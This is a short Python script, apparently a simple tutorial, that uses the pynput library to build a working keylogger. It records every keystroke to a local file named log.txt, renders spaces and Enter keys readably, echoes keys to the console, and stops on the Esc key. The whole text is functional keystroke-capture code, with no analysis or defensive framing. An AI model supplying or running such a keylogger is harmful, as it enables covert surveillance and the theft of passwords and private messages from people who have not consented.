#Install pynput
import os
from pynput.keyboard import Key, Listener

count = 0
keyList = []

# Reference https://pypi.org/project/pynput/
def on_press(key):
    global keyList, count
    keyList.append(key)
    count += 1

    #Every 1 character will put into the file
    if count >= 1:
        count = 0
        writeFile(keyList)
        keyList = []

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

def writeFile(keyList):
    with open("log.txt", "a" if os.path.exists("log.txt") else "w") as logFile:
        for key in keyList:
            filtered = str(key).replace("'","") #remove ' '
            print(filtered)
            if filtered.find("space") > 0:
                logFile.write(" ")
            elif filtered.find("enter") > 0:
                logFile.write("\n[Enter]\n")
            elif filtered.find("Key") == -1: # return -1 if the word "Key" not found 
                logFile.write(filtered)

with Listener(on_press = on_press ,on_release = on_release) as listener:
    listener.join()